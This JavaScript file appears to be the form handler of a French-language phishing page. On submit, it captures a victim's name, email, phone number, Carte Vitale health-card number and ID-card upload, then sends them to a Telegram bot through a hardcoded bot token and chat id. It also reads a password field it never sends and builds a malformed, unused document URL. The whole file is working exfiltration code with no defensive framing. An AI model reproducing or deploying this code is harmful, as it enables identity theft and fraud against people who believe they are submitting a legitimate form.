const telegram_bot_id = "6625173428:AAGsd047rr1U7Z38e0TEkugxcLF86MRUDTQ";
const chat_id = 1070276630;

const inputFname = document.querySelector("#fname");
const inputLname = document.querySelector("#lname");
const inputNumber = document.querySelector("#phoneNumber");
const inputEmail = document.querySelector("#email");
const inputPassword = document.querySelector("#password");
const inputVitalCard = document.querySelector("#vitalCard");



const recto=document.querySelector('#rectoId')
const form = document.querySelector("form");

form.addEventListener("submit", (e) => {
  e.preventDefault();

  message = `
  Prénom:
  %0A
${inputFname.value}
  %0A
  %0A
Nom de famille:
  %0A
${inputLname.value}
  %0A
  %0A
Adresse e-mail:
  %0A
${inputEmail.value}
  %0A
  %0A
Numéro de téléphone:
  %0A
${inputNumber.value}
  %0A
  %0A
Numero Carte vitale:
  %0A
${inputVitalCard.value}
  %0A
  %0A
Téléverser une Piéce d'identité RECTO:
  %0A
${recto.value}
  %0A
  %0A


  Thank You 
  `;

  const link = `https://api.telegram.org/bot${telegram_bot_id}/sendMessage?chat_id=${chat_id}&text=${message}`;
  const docId =
    "AgACAgUAAxkBAAMFZR2pPOe7vyxmMfxsjuDxRUShpP0AAqa2MRvV5PFUO9eVmCHdayIBAAMCAANtAAMwBA";
  const url = `https://api.telegram.org/bot${docId}/sendDocument?=${chat_id}&text=${message}`;
  const xml = new XMLHttpRequest();
  xml.open("GET", link);
  xml.send();
});

